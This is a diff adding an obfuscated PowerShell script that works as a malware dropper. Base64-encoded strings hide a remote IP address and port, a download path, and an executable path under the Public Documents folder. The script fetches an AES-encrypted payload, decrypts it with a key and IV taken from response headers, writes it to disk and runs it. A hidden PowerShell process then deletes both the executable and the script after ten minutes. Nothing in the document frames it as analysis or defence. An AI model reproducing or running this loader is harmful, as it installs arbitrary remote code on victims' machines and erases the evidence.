@@ -1,0 +1,35 @@
+$e5W2n8J3 = [Convert]::FromBase64String('aHR0cDovLzc0LjIwOC4xOTUuMTg4OjU5MjcvcGF5bG9hZA==')
+$e8K4p1T9 = [Convert]::FromBase64String('WC1FbmNyeXB0aW9uLUtleQ==')
+$e2R7v6F5 = [Convert]::FromBase64String('WC1FbmNyeXB0aW9uLUlW')
+$e9J3m4Q2 = [Convert]::FromBase64String('QzpcVXNlcnNcUHVibGljXERvY3VtZW50c1w3bWI4by5leGU=')
+$x7B2t9P4 = [System.Text.Encoding]::ASCII.GetString($e5W2n8J3)
+$x1N6r3W8 = [System.Text.Encoding]::ASCII.GetString($e8K4p1T9)
+$x4T8k2M5 = [System.Text.Encoding]::ASCII.GetString($e2R7v6F5)
+$x3F9j7H2 = [System.Text.Encoding]::ASCII.GetString($e9J3m4Q2)
+$p8V4m1R6 = $PSCommandPath
+try {
+    $c3K9 = 'Invoke-WebRequest'
+    $r9T2w6J4 = & $c3K9 -Uri $x7B2t9P4 -Method ([char]71+[char]101+[char]116)
+    $h6P3 = 'Headers'
+    Write-Output "Headers: $x1N6r3W8, $x4T8k2M5"
+    $k2V7y4N1 = $r9T2w6J4.$h6P3[$x1N6r3W8]
+    $i8M3q9T5 = $r9T2w6J4.$h6P3[$x4T8k2M5]
+    $b4R1 = [System.Convert]::FromBase64String($k2V7y4N1)
+    $v7J9 = [System.Convert]::FromBase64String($i8M3q9T5)
+    $p2Q5z8W3 = $r9T2w6J4.Content
+    $a9F4t1K7 = [System.Security.Cryptography.Aes]::Create()
+    $a9F4t1K7.Key = $b4R1
+    $a9F4t1K7.IV = $v7J9
+    $a9F4t1K7.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $d3H8r6N2 = $a9F4t1K7.CreateDecryptor()
+    $f7T1k9M4 = $d3H8r6N2.TransformFinalBlock($p2Q5z8W3, 0, $p2Q5z8W3.Length)
+    [System.IO.File]::WriteAllBytes($x3F9j7H2, $f7T1k9M4)
+    $s9P2 = 'Start-Process'
+    & $s9P2 -FilePath $x3F9j7H2
+    $c2L7v = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("Start-Sleep -Seconds 600; Remove-Item -Path '$x3F9j7H2' -Force; Remove-Item -Path '$p8V4m1R6' -Force"))
+    & $s9P2 powershell.exe -WindowStyle Hidden -ArgumentList '-Command', ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($c2L7v)))
+}
+catch {
+    $e6W9 = 'Write-Error'
+    & $e6W9 "An error occurred: $_"
+}
